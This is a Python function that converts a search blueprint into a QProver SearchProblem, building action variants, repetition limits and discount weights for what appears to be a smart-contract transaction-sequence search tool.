_REENTRY_AMOUNT_TOKEN = "__QPROVER_REENTRY_AMOUNT__"


def to_qprover_problem(blueprint: Track04SearchBlueprint):
    """Convert organizer-facing analysis into QProver's canonical SearchProblem."""
    from qprover.parameters import ActionVariant
    from qprover.search.bqm import SearchProblem

    variants = tuple(
        ActionVariant(
            action_id=variant.action_id,
            target_id="target",
            signature=variant.signature,
            sender_slot=0,
            args=variant.args,
            value_wei=variant.value_wei,
            max_repetitions=variant.max_repetitions,
            argument_provenance=tuple(
                ("trust404-static-domain",) for _ in variant.args
            ),
            value_provenance=("trust404-static-domain",),
        )
        for variant in blueprint.variants
    )
    repetition_limits: dict[str, int] = {}
    for action in blueprint.actions:
        limits = {
            variant.max_repetitions
            for variant in blueprint.variants
            if variant.action_id == action.id
        }
        if len(limits) != 1:
            raise ValueError(f"ambiguous repetition limit for {action.id}")
        repetition_limits[action.id] = limits.pop()
    discounts = tuple(
        1.0 / (index + 1) for index in range(blueprint.max_sequence_length)
    )
    return SearchProblem(
        actions=tuple(action.id for action in blueprint.actions),
        max_sequence_length=blueprint.max_sequence_length,
        utilities=blueprint.utilities,
        transitions=blueprint.transitions,
        repetition_limits=repetition_limits,
        discounts=discounts,
        variants=variants,
        hypothesis_sequences=blueprint.hypothesis_sequences,
        length_weight=1.5,
    )
